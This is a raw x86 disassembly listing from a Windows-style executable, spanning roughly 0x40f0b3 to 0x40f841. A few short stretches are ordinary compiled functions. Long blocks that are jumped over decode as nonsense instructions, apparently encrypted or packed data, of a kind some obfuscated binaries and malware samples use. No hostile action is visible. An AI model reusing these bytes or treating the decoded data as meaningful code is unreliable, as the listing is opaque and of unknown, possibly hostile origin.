  40f0b3:	inc    ebx
  40f0b4:	push   ebx
  40f0b5:	pop    eax
  40f0b6:	call   DWORD PTR [eax-0x1]
  40f0b9:	lea    eax,[ebp+0x4]
  40f0bc:	mov    DWORD PTR [ebp-0x58],eax
  40f0bf:	mov    eax,ds:0x414afe
  40f0c4:	push   0x4
  40f0c6:	add    eax,0x1cc
  40f0cb:	push   eax
  40f0cc:	lea    eax,[ebp-0x1c]
  40f0cf:	push   eax
  40f0d0:	call   0x4028d7
  40f0d5:	mov    eax,DWORD PTR [ebp-0x1c]
  40f0d8:	mov    eax,DWORD PTR [ebp-0x4]
  40f0db:	mov    eax,DWORD PTR [ebp-0x24]
  40f0de:	mov    DWORD PTR [ebp+0xc],eax
  40f0e1:	mov    eax,ds:0x414b82
  40f0e6:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0e9:	sub    eax,edi
  40f0eb:	xor    eax,esi
  40f0ed:	cmp    eax,ecx
  40f0ef:	je     0x40f136
  40f0f5:	mov    eax,ds:0x414b7a
  40f0fa:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0fd:	sub    eax,edi
  40f0ff:	xor    eax,esi
  40f101:	cmp    eax,ecx
  40f103:	jne    0x40f119
  40f109:	mov    eax,ds:0x414b82
  40f10e:	add    eax,DWORD PTR ds:0x414b7a
  40f114:	jmp    0x40f120
  40f119:	mov    eax,DWORD PTR [ebp+0xc]
  40f11c:	xor    eax,esi
  40f11e:	add    eax,edi
  40f120:	mov    ds:0x414b7a,eax
  40f125:	mov    eax,DWORD PTR [ebp+0xc]
  40f128:	xor    eax,esi
  40f12a:	add    eax,edi
  40f12c:	mov    ds:0x414b82,eax
  40f131:	jmp    0x40f140
  40f136:	mov    eax,ds:0x414b82
  40f13b:	mov    ds:0x414b7a,eax
  40f140:	mov    eax,DWORD PTR [ebp-0x58]
  40f143:	mov    ecx,DWORD PTR ds:0x414b7a
  40f149:	add    DWORD PTR [eax],ecx
  40f14b:	mov    eax,DWORD PTR [ebp-0x1c]
  40f14e:	mov    eax,DWORD PTR [eax]
  40f150:	pop    edi
  40f151:	pop    esi
  40f152:	pop    ebx
  40f153:	leave  
  40f154:	ret    0xc
  40f157:	push   ebp
  40f158:	mov    ebp,esp
  40f15a:	jmp    0x40f4ed
  40f15f:	repz call 0x655e557a
  40f165:	jae    0x40f1d8
  40f167:	hlt    
  40f168:	aaa    
  40f169:	scas   eax,DWORD PTR es:[edi]
  40f16a:	aad    0xce
  40f16c:	and    BYTE PTR [esi],bl
  40f16e:	or     ah,BYTE PTR [eax]
  40f170:	mov    dh,0x7e
  40f172:	jle    0x40f168
  40f174:	jns    0x40f1f4
  40f176:	jle    0x40f120
  40f178:	xchg   ebx,eax
  40f179:	jnp    0x40f123
  40f17b:	jns    0x40f15c
  40f17d:	pop    ebp
  40f17e:	xor    al,0xf4
  40f180:	sar    DWORD PTR [ebp-0x7039d603],1
  40f186:	mov    dh,0x92
  40f188:	pop    edx
  40f189:	add    eax,0x59b53798
  40f18e:	ins    BYTE PTR es:[edi],dx
  40f18f:	out    0xd7,eax
  40f191:	jmp    0x40f147
  40f193:	mov    ebx,0x2fd6ddb5
  40f198:	and    ebp,DWORD PTR [eax-0x15]
  40f19b:	inc    edx
  40f19c:	inc    ebp
  40f19d:	int3   
  40f19e:	pop    ecx
  40f19f:	cmp    BYTE PTR [eax],dh
  40f1a1:	xlat   BYTE PTR ds:[ebx]
  40f1a2:	and    BYTE PTR [ebp-0x7e],ah
  40f1a5:	and    BYTE PTR [edx],bl
  40f1a7:	lock jecxz 0x40f1ce
  40f1aa:	and    bh,BYTE PTR [ebx]
  40f1ac:	jne    0x40f1d7
  40f1ae:	dec    edi
  40f1af:	(bad)  
  40f1b1:	push   ecx
  40f1b2:	fcomp  QWORD PTR [esi-0x7c]
  40f1b5:	ss jl  0x40f15e
  40f1b8:	daa    
  40f1b9:	and    al,0x3b
  40f1bb:	inc    esi
  40f1bc:	xor    dh,bh
  40f1be:	test   BYTE PTR [ebp+0x37],dh
  40f1c1:	mov    ch,0x5f
  40f1c3:	or     eax,0xfffd363f
  40f1c8:	push   edi
  40f1c9:	sbb    edi,0xba179d29
  40f1cf:	pop    bp
  40f1d1:	xor    BYTE PTR [ebx+0x6e7959bc],0x1e
  40f1d8:	int3   
  40f1d9:	pop    edx
  40f1da:	pop    ecx
  40f1db:	es loopne 0x40f1e4
  40f1de:	rol    DWORD PTR [esi],0xf0
  40f1e1:	mov    WORD PTR [ecx+0x46dd8f2f],?
  40f1e7:	pushf  
  40f1e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1e9:	xchg   edi,eax
  40f1ea:	jge    0x40f258
  40f1ec:	pop    esi
  40f1ed:	cmp    dh,BYTE PTR [ecx+0x72f394fd]
  40f1f3:	xor    BYTE PTR [edx-0x15e3455b],bl
  40f1f9:	mov    ah,0x94
  40f1fb:	xor    eax,DWORD PTR [ecx-0x2e]
  40f1fe:	mov    esi,0x7760d880
  40f203:	enter  0xab3,0x63
  40f207:	inc    edx
  40f208:	add    al,0x64
  40f20a:	cmp    eax,0x3133723
  40f20f:	push   edi
  40f210:	popf   
  40f211:	jl     0x40f28b
  40f213:	or     DWORD PTR [ebx-0x656c3382],0x24
  40f21a:	add    DWORD PTR [ebx+0x21],esp
  40f21d:	in     al,0x4b
  40f21f:	inc    edx
  40f220:	out    dx,eax
  40f221:	cli    
  40f222:	inc    edx
  40f223:	lock sub al,0x82
  40f226:	dec    eax
  40f227:	inc    ecx
  40f228:	dec    ebp
  40f229:	out    0xf0,eax
  40f22b:	mov    ebx,0x32778103
  40f230:	pop    ebx
  40f231:	stc    
  40f232:	ja     0x40f1ef
  40f234:	cmp    esi,DWORD PTR [esi]
  40f236:	inc    edx
  40f237:	add    eax,0xfa139799
  40f23c:	sar    DWORD PTR [ecx-0x69],0xf1
  40f240:	test   BYTE PTR [edi-0x7f],ah
  40f243:	push   0x6f
  40f245:	or     ebx,DWORD PTR [edx+eiz*4-0x37]
  40f249:	std    
  40f24a:	stos   DWORD PTR es:[edi],eax
  40f24b:	aad    0xfd
  40f24d:	in     eax,dx
  40f24e:	inc    ebp
  40f24f:	jns    0x40f29c
  40f251:	fild   QWORD PTR [ecx+ebp*8+0x49]
  40f255:	call   0x68249912
  40f25a:	xor    DWORD PTR [ebp+0x560c5f95],esi
  40f260:	mov    BYTE PTR ds:0x45b55f6,bh
  40f266:	mov    bl,0xd4
  40f268:	cli    
  40f269:	xor    edx,DWORD PTR [edi+edx*4+0x3d895dc7]
  40f270:	sbb    ch,BYTE PTR [edx]
  40f272:	sub    esp,DWORD PTR [eax-0x392c939]
  40f278:	mov    WORD PTR [ebx-0xb],cs
  40f27b:	fs in  al,dx
  40f27d:	(bad)  
  40f27f:	mov    ecx,0xe3285c46
  40f284:	clc    
  40f285:	or     ch,BYTE PTR [ebx+0x5e]
  40f288:	jle    0x40f20c
  40f28a:	sti    
  40f28b:	dec    esp
  40f28c:	adc    eax,0xdbe1af53
  40f291:	add    eax,0x7e6e552c
  40f296:	outs   dx,DWORD PTR ds:[esi]
  40f297:	fldenv [eax+0x16]
  40f29a:	rol    al,cl
  40f29c:	jo     0x40f251
  40f29e:	ds lahf 
  40f2a0:	inc    ebp
  40f2a1:	push   edi
  40f2a2:	gs nop
  40f2a4:	jmp    0x8a77:0xb0a70b67
  40f2ab:	jmp    0x40f2e9
  40f2ad:	call   DWORD PTR [eax]
  40f2af:	pusha  
  40f2b0:	jne    0x40f253
  40f2b2:	inc    edi
  40f2b3:	imul   edx,DWORD PTR [edx],0x54
  40f2b6:	mov    esi,0x9a22a7d7
  40f2bb:	mov    al,0xf0
  40f2bd:	xchg   edx,eax
  40f2be:	push   ecx
  40f2bf:	sub    al,0x1e
  40f2c1:	stos   DWORD PTR es:[edi],eax
  40f2c2:	push   esp
  40f2c3:	fld    DWORD PTR [eax-0x72]
  40f2c6:	loope  0x40f2e4
  40f2c8:	mov    esp,DWORD PTR [esi]
  40f2ca:	outs   dx,BYTE PTR ds:[esi]
  40f2cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2cc:	cmp    BYTE PTR [ebx+0x6ce25ef2],ah
  40f2d2:	jl     0x40f2b3
  40f2d4:	popa   
  40f2d5:	pop    ebp
  40f2d6:	test   DWORD PTR [ecx],0x6ea30dba
  40f2dc:	push   ds
  40f2dd:	(bad)  
  40f2de:	retf   
  40f2df:	pop    ebx
  40f2e0:	push   esi
  40f2e1:	aas    
  40f2e2:	or     eax,eax
  40f2e4:	mov    edx,0x7a198988
  40f2e9:	nop
  40f2ea:	bound  ebx,QWORD PTR [ecx+0x48]
  40f2ed:	in     al,dx
  40f2ee:	pop    ebx
  40f2ef:	adc    DWORD PTR [ebx+0xf],ebx
  40f2f2:	icebp  
  40f2f3:	shl    ah,cl
  40f2f5:	cwde   
  40f2f6:	repnz add al,0x26
  40f2f9:	fdivr  st,st(5)
  40f2fb:	(bad)  
  40f2fc:	loope  0x40f2a3
  40f2fe:	push   edx
  40f2ff:	loop   0x40f2a5
  40f301:	xor    DWORD PTR [esi],esi
  40f303:	jl     0x40f358
  40f305:	and    ecx,ebx
  40f307:	inc    ebp
  40f308:	dec    edi
  40f309:	push   0x8c3c1658
  40f30e:	and    eax,0x70a3ddad
  40f313:	stos   BYTE PTR es:[edi],al
  40f314:	dec    esi
  40f315:	sbb    al,0x5b
  40f317:	dec    edi
  40f318:	sub    al,0xde
  40f31a:	out    dx,eax
  40f31b:	out    0x81,eax
  40f31d:	pusha  
  40f31e:	lods   eax,DWORD PTR ds:[esi]
  40f31f:	add    eax,0x962c47eb
  40f324:	loop   0x40f2a6
  40f326:	sbb    BYTE PTR [edi+0x48],bh
  40f329:	out    0x38,eax
  40f32b:	xchg   edi,eax
  40f32c:	dec    edi
  40f32d:	pop    ss
  40f32e:	mov    WORD PTR [esp+ebx*8-0x5f74d492],?
  40f335:	or     esi,0xffffff89
  40f338:	cdq    
  40f339:	jg     0x40f314
  40f33b:	mov    eax,ds:0x6a7c6097
  40f340:	mul    BYTE PTR [ecx+0x3e1ea2f]
  40f346:	xchg   edx,eax
  40f347:	dec    esp
  40f348:	mov    es,WORD PTR [esi-0x5a]
  40f34b:	std    
  40f34c:	xchg   ebx,edx
  40f34e:	fisubr DWORD PTR [ebx-0x24692fe1]
  40f354:	(bad)  
  40f355:	xchg   esi,eax
  40f356:	aaa    
  40f357:	adc    bh,BYTE PTR [ebx+0x39]
  40f35a:	(bad)  
  40f35b:	es inc edi
  40f35d:	rcr    BYTE PTR [edx+0x65],cl
  40f360:	or     ah,0x35
  40f363:	sbb    al,ch
  40f365:	push   ebx
  40f366:	push   es
  40f367:	push   es
  40f368:	jbe    0x40f33c
  40f36a:	push   0x27895ba9
  40f36f:	fidiv  DWORD PTR [ecx+0x7ce463be]
  40f375:	out    dx,al
  40f376:	inc    eax
  40f377:	in     eax,dx
  40f378:	lock lods al,BYTE PTR ds:[esi]
  40f37a:	push   ebx
  40f37b:	pop    esp
  40f37c:	fbstp  TBYTE PTR [edi+0x4d490ba6]
  40f382:	dec    esi
  40f383:	jne    0x40f3f6
  40f385:	das    
  40f386:	inc    eax
  40f387:	mov    esp,0x4073ee97
  40f38c:	sbb    esi,eax
  40f38e:	jo     0x40f355
  40f390:	fild   WORD PTR [ebx-0x3a]
  40f393:	retf   
  40f394:	add    eax,0x8af6b1ee
  40f399:	(bad)  
  40f39b:	pop    esi
  40f39c:	mov    al,ds:0x9f1b2b8e
  40f3a1:	xchg   esi,eax
  40f3a2:	or     cl,BYTE PTR [eax]
  40f3a4:	repnz (bad) 
  40f3a6:	out    0x45,eax
  40f3a8:	mov    bh,0x98
  40f3aa:	dec    edx
  40f3ab:	or     ebx,ecx
  40f3ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3ae:	jnp    0x40f36e
  40f3b0:	xor    DWORD PTR [edx],esp
  40f3b2:	and    eax,ebx
  40f3b4:	out    0x3,al
  40f3b6:	mov    ch,0xd4
  40f3b8:	mov    ds:0xbeedf759,eax
  40f3bd:	jle    0x40f408
  40f3bf:	sub    eax,0xe1a4e395
  40f3c4:	not    BYTE PTR [edx+eax*2-0x3b41b32e]
  40f3cb:	mov    eax,ds:0xe3d14bfc
  40f3d0:	add    ah,BYTE PTR ds:0x99040fd3
  40f3d6:	inc    esi
  40f3d7:	aad    0x8f
  40f3d9:	fnstenv [ecx+0x57]
  40f3dc:	push   ds
  40f3dd:	inc    eax
  40f3de:	das    
  40f3df:	inc    edx
  40f3e0:	inc    edi
  40f3e1:	std    
  40f3e2:	sbb    BYTE PTR es:[ebx+esi*8+0x5a],bl
  40f3e7:	inc    edi
  40f3e8:	xchg   ecx,eax
  40f3e9:	ret    
  40f3ea:	stos   BYTE PTR es:[edi],al
  40f3eb:	or     al,0x47
  40f3ed:	mov    ebp,0x3ab3a6af
  40f3f2:	sub    al,0x72
  40f3f4:	lock test bl,dh
  40f3f7:	pop    ds
  40f3f8:	into   
  40f3f9:	loopne 0x40f449
  40f3fb:	lock mov ah,0x63
  40f3fe:	or     ebx,ebp
  40f400:	rol    BYTE PTR [ebx+eax*1-0xe46776a],0x43
  40f408:	xchg   esp,eax
  40f409:	pop    ds
  40f40a:	xchg   DWORD PTR [ebx],ecx
  40f40c:	jp     0x40f44e
  40f40e:	xchg   ebx,esi
  40f410:	pop    es
  40f411:	adc    esi,DWORD PTR [ebx-0x22]
  40f414:	(bad)  
  40f415:	outs   dx,BYTE PTR ds:[esi]
  40f416:	or     eax,0xbca5699d
  40f41b:	jle    0x40f3df
  40f41d:	ins    DWORD PTR es:[edi],dx
  40f41e:	mov    edx,0xe51b75cc
  40f423:	push   esp
  40f424:	push   ds
  40f425:	(bad)  
  40f427:	adc    dl,BYTE PTR [ebp-0x5a6195b3]
  40f42d:	and    al,0x72
  40f42f:	dec    ebx
  40f430:	movsx  esi,BYTE PTR [ecx]
  40f433:	add    al,0x97
  40f435:	aaa    
  40f436:	sub    eax,0x25f686ea
  40f43b:	xor    al,cl
  40f43d:	hlt    
  40f43e:	cli    
  40f43f:	loopne 0x40f467
  40f441:	mov    BYTE PTR [eax+0x21],cl
  40f444:	mov    ecx,0x2496ad21
  40f449:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f44a:	jp     0x40f421
  40f44c:	pop    ebx
  40f44d:	ss jo  0x40f401
  40f450:	cmc    
  40f451:	or     DWORD PTR [ecx],ebx
  40f453:	imul   esi,DWORD PTR ds:[ebx],0xfba99048
  40f45a:	mov    esi,0x231cf49f
  40f45f:	inc    edx
  40f460:	push   ebx
  40f461:	mov    dh,0xd8
  40f463:	adc    ah,BYTE PTR [ebp-0x4d]
  40f466:	test   DWORD PTR [ecx+0x678ec000],eax
  40f46c:	out    dx,eax
  40f46d:	dec    esi
  40f46e:	xchg   esi,eax
  40f46f:	addr16 pop ebp
  40f471:	mov    cl,0xc8
  40f473:	stc    
  40f474:	xlat   BYTE PTR ds:[ebx]
  40f475:	call   0x622bc9cc
  40f47a:	adc    ecx,DWORD PTR [edi-0x71837586]
  40f480:	cld    
  40f481:	xchg   esp,eax
  40f482:	int    0xc0
  40f484:	xchg   dl,cl
  40f486:	cmp    BYTE PTR [ebp+0x6ceb9a90],0x6c
  40f48d:	add    cl,dh
  40f48f:	pop    ecx
  40f490:	fild   WORD PTR [edx+ebp*2+0x42]
  40f494:	fdiv   QWORD PTR [esi-0x9]
  40f497:	xchg   edx,eax
  40f498:	mov    cl,0xb5
  40f49a:	call   WORD PTR [bx+di-0x3423]
  40f4a0:	add    al,0x47
  40f4a2:	adc    edx,DWORD PTR [ebx]
  40f4a4:	push   edx
  40f4a5:	jbe    0x40f4e4
  40f4a7:	ja     0x40f462
  40f4a9:	inc    esp
  40f4aa:	popf   
  40f4ab:	mov    ebp,0xbe0e11f9
  40f4b0:	pop    ebp
  40f4b1:	cmp    eax,0xe6b5718c
  40f4b6:	push   esp
  40f4b7:	inc    ebx
  40f4b8:	out    dx,al
  40f4b9:	mov    ds:0xab1002f2,al
  40f4be:	pushf  
  40f4bf:	xchg   ebx,eax
  40f4c0:	ror    DWORD PTR [eax+eiz*1],1
  40f4c3:	push   ebp
  40f4c4:	xor    BYTE PTR [esi+edx*4-0xc],cl
  40f4c8:	xchg   ebx,eax
  40f4c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4ca:	sti    
  40f4cb:	pop    edx
  40f4cd:	imul   esp
  40f4cf:	inc    esi
  40f4d0:	xchg   esp,eax
  40f4d1:	in     al,dx
  40f4d2:	cmp    BYTE PTR [edi],cl
  40f4d4:	faddp  st(4),st
  40f4d6:	cld    
  40f4d7:	mov    eax,0xb8f49223
  40f4dc:	and    eax,0xfb10c929
  40f4e1:	adc    ecx,DWORD PTR [edi]
  40f4e3:	(bad)  
  40f4e4:	pop    ds
  40f4e5:	enter  0xa4b0,0xec
  40f4e9:	sbb    DWORD PTR [ebp+0x2d],eax
  40f4ec:	cmp    BYTE PTR [ecx+0x51],dl
  40f4ef:	mov    eax,0xf89c8539
  40f4f4:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  40f4fb:	mov    DWORD PTR ds:0x43467b,0x36a0
  40f505:	push   esi
  40f506:	mov    ecx,DWORD PTR ds:0x43468b
  40f50c:	mov    DWORD PTR [ebp-0x8],eax
  40f50f:	mov    ecx,DWORD PTR [ebp+0x8]
  40f512:	mov    DWORD PTR ds:0x434653,0x6a14
  40f51c:	push   edi
  40f51d:	mov    DWORD PTR ds:0x43467f,0x48b4
  40f527:	mov    edi,0x7510851
  40f52c:	mov    DWORD PTR ds:0x4345bf,0x7e06
  40f536:	mov    esi,0x327299
  40f53b:	mov    DWORD PTR ds:0x43460b,0x7203
  40f545:	cmp    ecx,eax
  40f547:	je     0x40fd56
  40f54d:	or     eax,eax
  40f54f:	jmp    0x40f8e2
  40f554:	cmc    
  40f555:	pop    esp
  40f556:	inc    ebp
  40f557:	gs ins DWORD PTR es:[edi],dx
  40f559:	jge    0x40f550
  40f55b:	pop    esp
  40f55c:	push   0xffffffac
  40f55e:	add    ah,BYTE PTR [esi-0x7f]
  40f561:	adc    dh,dh
  40f563:	inc    esi
  40f564:	sahf   
  40f565:	mov    cl,0x7e
  40f567:	jle    0x40f55d
  40f569:	jns    0x40f5e9
  40f56b:	jle    0x40f51d
  40f56d:	cmp    BYTE PTR [esi+0x62],0x90
  40f571:	mov    dl,0x50
  40f573:	jl     0x40f59e
  40f575:	sahf   
  40f576:	mov    al,ds:0x1bcb5723
  40f57b:	lds    eax,FWORD PTR [ebp-0x63]
  40f57e:	shl    BYTE PTR [ebx-0x2b],1
  40f581:	sbb    al,0x3d
  40f583:	ss cli 
  40f585:	or     al,0x28
  40f587:	in     al,0xd7
  40f589:	loope  0x40f546
  40f58b:	jno    0x40f5e3
  40f58d:	dec    edi
  40f58e:	jmp    0x40f5dd
  40f590:	mov    ch,0x47
  40f592:	jno    0x40f610
  40f594:	ins    BYTE PTR es:[edi],dx
  40f595:	jg     0x40f5ca
  40f597:	cs mov bl,0x2a
  40f59a:	sub    eax,0xc93f3435
  40f59f:	rcl    DWORD PTR [ebp-0x63],0xc2
  40f5a3:	xor    eax,DWORD PTR [ebp-0x5cbb9b17]
  40f5a9:	jg     0x40f560
  40f5ab:	xlat   BYTE PTR ds:[ebx]
  40f5ac:	in     eax,0x7b
  40f5ae:	sub    eax,0x8a6e9ba8
  40f5b3:	fld    DWORD PTR [eax+0x29]
  40f5b6:	sbb    eax,0xa26dad13
  40f5bb:	jbe    0x40f62c
  40f5bd:	dec    ecx
  40f5be:	shl    DWORD PTR [esi+eax*8-0x52],1
  40f5c2:	imul   esp,DWORD PTR [ebx],0xffffffd9
  40f5c5:	dec    ebp
  40f5c6:	pop    esi
  40f5c7:	jb     0x40f60d
  40f5c9:	(bad)  
  40f5cb:	mov    ds:0xeba834b,al
  40f5d0:	hlt    
  40f5d1:	je     0x40f5ce
  40f5d3:	mov    ds,WORD PTR [eax]
  40f5d5:	push   ebx
  40f5d6:	jg     0x40f5bf
  40f5d8:	(bad)  
  40f5d9:	std    
  40f5da:	mov    ebp,cs
  40f5dc:	mov    al,0xe2
  40f5de:	ret    0x8587
  40f5e1:	rcl    ebp,0x9c
  40f5e4:	fbstp  TBYTE PTR [esi]
  40f5e6:	sbb    bl,BYTE PTR [eax-0x2d6790e4]
  40f5ec:	retf   
  40f5ed:	(bad)  
  40f5ee:	mov    ah,0x2b
  40f5f0:	jmp    0x40f62b
  40f5f2:	and    ch,BYTE PTR [ecx+0x1a]
  40f5f5:	aam    0x36
  40f5f7:	je     0x40f63e
  40f5f9:	jp     0x40f593
  40f5fb:	and    esp,DWORD PTR [ebx-0x42]
  40f5fe:	push   eax
  40f5ff:	ins    BYTE PTR es:[edi],dx
  40f600:	adc    ch,ch
  40f602:	push   esp
  40f603:	or     eax,0xa2afcf6b
  40f608:	mov    al,0x78
  40f60a:	inc    ebx
  40f60b:	pop    eax
  40f60c:	or     BYTE PTR [ebx],bh
  40f60e:	popf   
  40f60f:	test   al,0x38
  40f611:	xchg   ecx,edi
  40f613:	xor    esi,edi
  40f615:	shr    BYTE PTR [ecx-0x598abaec],0xab
  40f61c:	ficomp DWORD PTR [edi-0x3]
  40f61f:	leave  
  40f620:	int    0x9c
  40f622:	ja     0x40f60f
  40f624:	fwait
  40f625:	inc    esp
  40f626:	pop    esp
  40f627:	mov    ebp,0x1f1c024b
  40f62c:	xchg   ebp,eax
  40f62d:	inc    ebp
  40f62e:	dec    edi
  40f62f:	and    al,0xb6
  40f631:	stos   BYTE PTR es:[edi],al
  40f632:	(bad)  
  40f633:	out    0xb8,eax
  40f635:	loop   0x40f689
  40f637:	xor    ecx,ecx
  40f639:	mov    dl,0xee
  40f63b:	imul   edx,ebx,0xffffffad
  40f63e:	loope  0x40f5ff
  40f640:	dec    edi
  40f641:	push   0x9e1f1fc4
  40f646:	mov    gs,esi
  40f648:	lods   eax,DWORD PTR ds:[esi]
  40f649:	pop    ds
  40f64a:	mov    ebx,ebp
  40f64c:	jmp    0xb4097f7b
  40f651:	adc    bh,BYTE PTR [ebx+0x33]
  40f654:	inc    edx
  40f655:	ror    BYTE PTR [edx],cl
  40f657:	mov    bl,0xe4
  40f659:	out    0xa9,eax
  40f65b:	sbb    eax,0x6f42414d
  40f660:	adc    al,0x36
  40f662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f663:	or     dh,dh
  40f665:	jmp    0xc2dc:0x153b3f4e
  40f66c:	sub    DWORD PTR [ebx+eiz*8-0x1330a402],ebx
  40f673:	les    eax,FWORD PTR ds:0xfe80b108
  40f679:	mov    ecx,0x2b7ae136
  40f67e:	mov    eax,ds:0xbca54099
  40f683:	repnz push edx
  40f685:	mov    BYTE PTR [ebp+0xe17479c],bh
  40f68b:	adc    edx,edx
  40f68d:	mov    edi,0x3184a712
  40f692:	jno    0x40f614
  40f694:	outs   dx,DWORD PTR ds:[esi]
  40f695:	call   0xfa7855c2
  40f69a:	daa    
  40f69b:	outs   dx,DWORD PTR ds:[esi]
  40f69c:	icebp  
  40f69d:	test   al,0x3
  40f69f:	or     ecx,ecx
  40f6a1:	or     eax,0x7a090be3
  40f6a6:	push   esp
  40f6a7:	xchg   esi,eax
  40f6a8:	mov    ds:0xaf4b3d5,eax
  40f6ad:	test   al,0xa6
  40f6af:	mov    dh,0xe0
  40f6b1:	jmp    0x40f68c
  40f6b3:	pop    ebx
  40f6b4:	imul   esp,DWORD PTR es:[esi-0x3437ce93],0x5d
  40f6bc:	call   0x69c8:0x18b36c08
  40f6c3:	mov    edi,0x89f3530f
  40f6c8:	imul   ebp
  40f6ca:	sbb    eax,0xd9d5a5d
  40f6cf:	xor    al,0xa7
  40f6d1:	or     BYTE PTR [ebx+0x3acc54aa],ah
  40f6d7:	push   esi
  40f6d8:	gs mov eax,0x777b7f51
  40f6de:	mov    edi,DWORD PTR [edi]
  40f6e0:	mov    BYTE PTR [edi+ebp*2],0xda
  40f6e4:	jge    0x40f6df
  40f6e6:	add    dh,al
  40f6e8:	imul   ecx,DWORD PTR [edx-0x5f],0x25b4fb91
  40f6ef:	stos   BYTE PTR es:[edi],al
  40f6f0:	jo     0x40f676
  40f6f2:	inc    ebx
  40f6f3:	or     bl,BYTE PTR [eax]
  40f6f5:	xor    eax,0xab420539
  40f6fa:	aad    0xaa
  40f6fc:	push   ebx
  40f6fd:	aad    0x59
  40f6ff:	idiv   esp
  40f701:	in     eax,dx
  40f702:	adc    dh,BYTE PTR [edx-0x6ebab628]
  40f708:	cdq    
  40f709:	enter  0x358,0x3f
  40f70d:	xor    al,0x95
  40f70f:	jne    0x40f6e5
  40f711:	adc    bh,bh
  40f713:	pop    eax
  40f714:	push   cs
  40f715:	push   es
  40f716:	mov    ds:0x337af5d0,eax
  40f71b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f71c:	pusha  
  40f71d:	test   DWORD PTR [edx],edi
  40f71f:	bound  ebx,QWORD PTR [eax]
  40f721:	inc    ebx
  40f722:	or     DWORD PTR [esi-0x25],ebp
  40f725:	(bad)  
  40f727:	pop    ds
  40f728:	mov    eax,ss
  40f72a:	mov    al,0x30
  40f72c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f72d:	or     BYTE PTR [edi],al
  40f72f:	pop    es
  40f730:	sar    BYTE PTR [ebp+0x8d240e2],1
  40f736:	mul    BYTE PTR [edi+0x78b46ef6]
  40f73c:	fbstp  TBYTE PTR [edx+0x24]
  40f73f:	aad    0x20
  40f741:	xchg   edi,eax
  40f742:	cwde   
  40f743:	rcl    BYTE PTR [ebp-0x2b],cl
  40f746:	(bad)  
  40f747:	jne    0x40f720
  40f749:	or     eax,0x938109e7
  40f74e:	sub    BYTE PTR [ebp-0x23990e25],bl
  40f754:	test   BYTE PTR [edi+0x1693b82d],bh
  40f75a:	sbb    dh,BYTE PTR [edi]
  40f75c:	into   
  40f75d:	push   ss
  40f75e:	aas    
  40f75f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f760:	aaa    
  40f761:	in     al,0x18
  40f763:	add    al,0xb6
  40f765:	pop    es
  40f766:	in     eax,0x14
  40f768:	adc    eax,0x19f7ebb3
  40f76d:	pushf  
  40f76e:	idiv   BYTE PTR [eax-0x30]
  40f771:	test   DWORD PTR [edx-0x1],eax
  40f774:	mov    edi,0xf9f6d3b1
  40f779:	add    eax,0x57e2a414
  40f77e:	add    DWORD PTR [ebx+0x36],ebx
  40f781:	mov    ah,0xa3
  40f783:	inc    esi
  40f784:	sub    BYTE PTR [ebp+0x2e],ah
  40f787:	mov    esi,0x6b3dcbdc
  40f78c:	add    BYTE PTR [eax-0x3f],0x53
  40f790:	cmp    eax,DWORD PTR [ebp-0x75]
  40f793:	push   esp
  40f794:	test   cl,al
  40f796:	inc    esp
  40f797:	ss sbb eax,0x83244730
  40f79d:	xor    DWORD PTR [edx],ebp
  40f79f:	lahf   
  40f7a0:	push   edi
  40f7a1:	push   0x76
  40f7a3:	ja     0x40f767
  40f7a5:	call   DWORD PTR [esi-0x126d4aa3]
  40f7ab:	popf   
  40f7ac:	and    DWORD PTR [esi+0x38],eax
  40f7af:	rol    DWORD PTR [edx-0x52],1
  40f7b2:	xchg   ebp,eax
  40f7b3:	repz and eax,0x8571af56
  40f7b9:	mov    ecx,edi
  40f7bb:	(bad)  
  40f7bc:	mov    eax,ds:0xd3eecda4
  40f7c1:	pop    esp
  40f7c2:	ins    BYTE PTR es:[edi],dx
  40f7c3:	push   esi
  40f7c4:	into   
  40f7c5:	cmp    esp,ebx
  40f7c7:	jne    0x40f7bb
  40f7c9:	jmp    0x40f751
  40f7cb:	xor    BYTE PTR [edi+0x7044959],ah
  40f7d1:	lock adc dh,BYTE PTR cs:[eax]
  40f7d5:	sti    
  40f7d6:	call   DWORD PTR cs:[ebx]
  40f7d9:	lods   al,BYTE PTR ds:[esi]
  40f7da:	jbe    0x40f7d4
  40f7dc:	popf   
  40f7dd:	mov    WORD PTR [eax],ds
  40f7df:	adc    bh,bh
  40f7e1:	or     BYTE PTR [ecx-0x73],bl
  40f7e4:	jbe    0x40f7ba
  40f7e6:	inc    edx
  40f7e7:	mov    edi,0x68c3acba
  40f7ec:	inc    edi
  40f7ed:	inc    edi
  40f7ee:	pop    ecx
  40f7ef:	loope  0x40f848
  40f7f1:	xor    eax,DWORD PTR [eax-0x82186d]
  40f7f7:	loop   0x40f7f2
  40f7f9:	sub    ah,cl
  40f7fb:	(bad)  
  40f7fc:	ja     0x40f7ed
  40f7fe:	sub    eax,DWORD PTR [edx+edi*8-0x7b]
  40f802:	jbe    0x40f7d8
  40f804:	push   eax
  40f805:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f806:	mov    WORD PTR [eax-0x11d27087],es
  40f80c:	inc    esi
  40f80d:	adc    esp,0x6704512b
  40f813:	adc    esp,DWORD PTR [edx+0x53]
  40f816:	xchg   edx,eax
  40f817:	shr    DWORD PTR [eax],1
  40f819:	and    dl,BYTE PTR [ecx+0x15eaf91a]
  40f81f:	or     DWORD PTR [ecx+0x39247680],ebp
  40f825:	jns    0x40f81a
  40f827:	dec    edx
  40f828:	lods   al,BYTE PTR ds:[esi]
  40f829:	add    eax,0x69cc0076
  40f82e:	or     cl,BYTE PTR [ebp-0x4f]
  40f831:	add    al,BYTE PTR [ebx]
  40f833:	add    bl,bl
  40f835:	out    0x79,al
  40f837:	cdq    
  40f838:	jne    0x40f839
  40f83a:	sar    DWORD PTR [edi],0xf1
  40f83d:	dec    ecx
  40f83e:	pop    es
  40f83f:	and    al,0xc8
  40f841:	sti    
